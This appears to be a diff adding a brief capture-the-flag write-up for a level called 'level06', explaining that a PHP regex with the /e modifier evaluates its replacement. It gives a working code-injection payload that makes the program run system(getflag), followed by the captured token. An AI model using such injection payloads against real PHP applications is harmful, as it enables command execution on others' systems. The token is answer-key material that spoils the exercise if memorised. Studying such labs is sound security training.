@@ -1,0 +1,24 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗  ██████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔═████╗██╔════╝ 
+██║     █████╗  ██║   ██║█████╗  ██║         ██║██╔██║███████╗ 
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ████╔╝██║██╔═══██╗
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝╚██████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝  ╚═════╝
+
+
+We have a Source code and it's executable.
+
+After indenting the code we see two functions :
+-> function y($m) and function x($y, $z)
+
+The first regex match with something like : [x ...]
+
+The /e means that we will not replace by a string but the result of a function.
+
+echo "[x {\${system(getflag)}}]" > /tmp/file
+
+./level06 /tmp/file
+                                |═══════════════════════════|
+Check flag.Here is your token : | wiok45aaoguiboiki2tuin6ub |
+                                |═══════════════════════════|
